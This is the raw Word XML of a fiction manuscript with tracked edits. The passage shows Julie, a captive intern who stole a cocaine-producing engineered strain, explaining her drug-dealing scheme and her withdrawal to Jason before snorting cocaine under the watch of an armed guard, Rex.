          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> gene. The metabolic pathway for cocaine synthesis has about forty. It’s mostly done by robots. But you have to do follow-up tests by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smiled. “Which is exactly the kind of task that they’d give an intern.”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Julie nodded. “Exactly. It was my job to check on the batches. So when one of them finally produced an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strain that was expressing </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the cocaine biosynthesis genes, I was the first to see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you were supposed to call in the senior researchers. But instead,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I just… you know…”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“Took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nodded. “They eventually realized that something was up. Damned if I know how. Sensor data from the robots, maybe? But by then I was already making batches of my own, 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started selling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lips curled into a grin that was equal parts cocky and wistful. “I was building my own empire, man! I hired dealers at redneck dives and biker bars. You should have seen me! There I was, in these flannel-and-jeans trash pits with peanuts all over the floor, and I’m in a thousand-dollar nightclub dress and gladiator stilletos, looking like goddamned Miami Beach royalty, with guys tripping over themselves to see what I’m all about. In just two weeks, I managed to take over the entire Valley Freeway corridor, from Renton to Puyallup. You would not believe how fast the money poured in! I could sell for cheaper than anything they’d ever seen, and there was no limit to my supply — so I was basically unstoppable.”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looked down at the uncovered mattress. “‘Unstoppable’. Right… I’</w:t>
      </w:r>
      <w:ins w:id="2094" w:author="TextVet" w:date="2016-03-22T10:31:00Z">
        <w:r w:rsidR="006D79A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ll</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2095" w:author="TextVet" w:date="2016-03-22T10:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006D79A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>m going to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> take a wild guess that those dealers and distribution channels belonged to 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grin disappeared. “Yeah.”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shook his head. “So. You were poaching an established drug lord’s workers. And encroaching on his territory. Julie… Jesus… What were you thinking?”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curled up on her side in a fetal position, the Eppendorf tube between her palms.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“Of course,” Jason said with a sigh. “You thought you had a secret weapon. A disruptive technology. You thought you could outwit the entrenched powers at their own game. You got a small taste of success, and it was too delicious to let go.”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Julie started bawling. “Why </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>should</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> I have to let it go? Why can’t I win just this once? Why is nothing I do ever good enough? I get a full scholarship to the University of Washington and my parents are like, ‘Why not Berkeley or MIT?’ I score 97% on my organic chemistry final, and they go, ‘Why not a hundred?’ I’ve worked so fucking hard…”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laid a hand softly on her shoulder and gave her a light shake. “Hey Julie… Julie… I need you to explain one more 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sobs abated long enough for her to sit back up and focus her eyes back on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“You’ve told me the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>how</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, but not the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>why</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Tungsten was working full-time to develop this living cocaine dispenser. But from a business perspective, that doesn’t make any sense. The end product is illegal to sell. What was Tungsten’s market strategy?”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mean like how to make money off of it?” asked Julie. “All I know are rumors. The scientists talked about medical applications. They believe the future of psychopharmacology is dopamine.”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“Dopamine?”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“It’s a neurotransmitter,” </w:t>
      </w:r>
      <w:ins w:id="2096" w:author="TextVet" w:date="2016-03-22T10:34:00Z">
        <w:r w:rsidR="004A43EE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>explaine</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2097" w:author="TextVet" w:date="2016-03-22T10:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004A43EE">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 Julie. “It runs the nucleus accumbens, the ‘pleasure center’ of the brain. It controls motivation, excitement, attention, that kind of thing. There’s this class of drugs called DRIs — dopamine reuptake inhibitors. Wellbutrin, Ritalin, Adderall — they’re all DRIs. They jam the brain’s dopamine-draining machinery — they make dopaminergic pathways flood themselves, like running a sink with a clogged drain.”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effect does that have?”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it’s a rush</w:t>
      </w:r>
      <w:ins w:id="2098" w:author="TextVet" w:date="2016-03-22T10:34:00Z">
        <w:r w:rsidR="004A4C01">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r w:rsidR="004A4C01">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> thrill of victory, sort of. Like, if you ace a test at school, it’s how you feel at seeing that </w:t>
      </w:r>
      <w:ins w:id="2099" w:author="TextVet" w:date="2016-03-22T10:34:00Z">
        <w:r w:rsidR="002D092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A+</w:t>
      </w:r>
      <w:ins w:id="2100" w:author="TextVet" w:date="2016-03-22T10:34:00Z">
        <w:r w:rsidR="002D092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Or you’re playing piano and nail an arpeggio you’ve been struggling with. Or you beat someone at a game. Or win a bet. Or score big in the stock market…”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nodded knowingly. “A cocaine high.”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“Exactly,” Julie replied. “Cocaine is the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>original</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> DRI. What we’re now figuring out how to do with synthetic drugs, the coca plant has been doing naturally for millions of years.”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up from the dials and buttons of a tall, cylindrical vat he had been idly fiddling with. His mouth was agape. “Jason! </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>You’ve</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> tried cocaine?”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chuckled. “I made my first million in my mid-twenties in 1981, Danny. You do the math.” He turned his gaze back to the sullen, unwashed girl. “And I know what she’s going through right now. The withdrawal</w:t>
      </w:r>
      <w:ins w:id="2101" w:author="TextVet" w:date="2016-03-22T10:37:00Z">
        <w:r w:rsidR="002837F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2102" w:author="TextVet" w:date="2016-03-22T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002837F2">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103" w:author="TextVet" w:date="2016-03-22T10:37:00Z">
        <w:r w:rsidR="002837F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2104" w:author="TextVet" w:date="2016-03-22T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002837F2">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he feeling that all your self-worth, all your joy, all your potential, has been drained out of your very soul, and nothing will ever make it come back.”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curled into her pajamas and turned away from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thing about cocaine is,” Jason continued, “it gives you a feeling of accomplishment. Just straight-up </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gives</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it to you — without you having to do anything to earn it. It’s great stuff, in a way. Who needs to actually pursue dreams or achieve goals, when you can just snort pure pride and satisfaction right up your nose?” He leaned into her and said quietly, “But you eventually learn it’s a fake feeling. You can’t outsmart your own mind. You yourself know perfectly well whether or not you’ve achieved your own goals, because you’re the one </w:t>
      </w:r>
      <w:ins w:id="2105" w:author="TextVet" w:date="2016-03-22T10:38:00Z">
        <w:r w:rsidR="00521A0F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>who</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2106" w:author="TextVet" w:date="2016-03-22T10:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00521A0F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> defines those goals in the first place. And when that happens… When you reach that realization… After that point, no matter how much you do, it’s never, ever going to be enough. Julie… Isn’t that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jerked her head toward him and glared. “We had a deal…!”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gave her a last look and stood up with a grunt. “I’ll go talk to that Rex guy upstairs. Thank you, Julie. You’ve been… helpful.”</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Jason descended the stairs.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Rex closely followed with gun in hand. Julie kept her eyes fixed on them. “Well?”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Rex sat down on the folding chair and laid the gun across his lap. From his pocket he produced a small white package, which he laid on the table. With a rhythmic tapping of a razor blade against the metal tabletop, he chopped its contents into ever finer grains, and drew out thin parallel lines of powder.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Julie’s face lit up in an ecstatic grin. With her small body and oversized </w:t>
      </w:r>
      <w:ins w:id="2107" w:author="TextVet" w:date="2016-03-22T10:40:00Z">
        <w:r w:rsidR="00067424">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2108" w:author="TextVet" w:date="2016-03-22T10:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00067424">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-shirt, she looked like a child beaming at the sight of presents under the tree on a wintry white Christmas morning. But for her, the greatest present of all was the snow.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got any idea how much trouble I’d be in if the boss-man found out?” Rex grumbled as he worked. “We’re in lockdown. I was supposed to flush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stared transfixed at the rails of coke with an expression not unlike Pavlov’s dogs upon hearing a bell.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Rex rolled up a dollar bill into a tight tube. He sat up straight, tossed his long stringy blond hair behind his head, and exhaled fully. Then, in one contin</w:t>
      </w:r>
      <w:ins w:id="2109" w:author="TextVet" w:date="2016-03-22T10:41:00Z">
        <w:r w:rsidR="00E86BF6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>u</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2110" w:author="TextVet" w:date="2016-03-22T10:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E86BF6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ous motion, he brought the rolled-up bill to his nostril, bowed his head, and traced the end of the green tube along the bottom</w:t>
      </w:r>
      <w:del w:id="2111" w:author="TextVet" w:date="2016-03-22T10:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008F6C5F">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most line. When all the granules had disappeared up his nose, he pitched his head back, closed his eyes, and emitted a satisfied sigh.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tried to body-check him off of the chair. “My turn!”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Rex pushed her away and raised his gun. “Mind your manners, little lady! Guests first. Gentlemen?”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stood petrified. Jason shook his head.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Rex eyed Jason dubiously. “Numbers? You don’t want any?”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thanks, Rex,” said Jason. “Umm… Diggitty’s on all sorts of medication, so he can’t have any. And me, I’m too old to get much out of it anymore.”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sure?” Rex persisted. “It’s top-notch stuff.”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don’t get a high from coke,” said Jason. “I just get a headache.”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shit. I hope I never get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old,” Rex grunted, rising from his chair.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had barely lifted his rear from </w:t>
      </w:r>
      <w:del w:id="2112" w:author="TextVet" w:date="2016-03-22T10:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F25187">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the seat before Julie slid in and grabbed the rolled-up bill. She </w:t>
      </w:r>
      <w:commentRangeStart w:id="2113"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dove</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2113"/>
      <w:r w:rsidR="00E03C30">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2113"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> straight into the next line on the table, </w:t>
      </w:r>
      <w:ins w:id="2114" w:author="TextVet" w:date="2016-03-22T10:53:00Z">
        <w:r w:rsidR="001A62A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>vacuum</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2115" w:author="TextVet" w:date="2016-03-22T10:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001A62A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>snort</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing it up as quickly as her nos</w:t>
      </w:r>
      <w:ins w:id="2116" w:author="TextVet" w:date="2016-03-22T10:53:00Z">
        <w:r w:rsidR="00392F30">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>tril</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2117" w:author="TextVet" w:date="2016-03-22T10:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00392F30">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xml:space="preserve"> would allow. She held her breath for several seconds, looking like she was about to sneeze. Tears </w:t>
      </w:r>
      <w:ins w:id="2118" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidR="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>laked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2119" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>built up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in her eyes</w:t>
      </w:r>
      <w:ins w:id="2120" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidR="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2121" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E3346">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122" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidR="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2123" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">er accelerating pulse </w:t>
      </w:r>
      <w:del w:id="2124" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2125" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidR="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>thr</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2126" w:author="TextVet" w:date="2016-03-22T10:55:00Z">
        <w:r w:rsidR="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>obb</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2127" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidR="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2128" w:author="TextVet" w:date="2016-03-22T10:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E3346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>visible</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in her ears.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After several seconds of sitting motionless, she finally made a sound: a euphoric</w:t>
      </w:r>
      <w:del w:id="2129" w:author="TextVet" w:date="2016-03-22T10:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C77BB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, delighted</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, childlike laugh.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 can’t feel my face!” she giggled, and traced her fingers sensuously across her mouth and cheeks.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watched her indulge. “Listen, Julie. You still have the vial,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sat in unresponsive bliss.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the vial…” he persisted.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abruptly turned. “Dude I can hear you just fine, shut the fuck up,” she snapped, her voice rapid and energetic. “Can’t a girl enjoy a freakin’ high? It’s my first hit in like a week, so let me fucking roll with it, okay? Christ. Buzzkill.”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“Part of the deal I struck with Rex,” said Jason, “is that you’d start the incubation.”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fuck that! He’s going to shoot me the minute I finish a batch.”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Rex rolled his wide-pupilled eyes. “I keep telling you, bitch. If you behave, nobody’s going to hurt you. Fuck, I’ll shoot you if you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>don’t</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> make a batch.”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“Fine, fine,” said the girl. “Let me do the rest of these lines</w:t>
      </w:r>
      <w:ins w:id="2130" w:author="TextVet" w:date="2016-03-22T10:58:00Z">
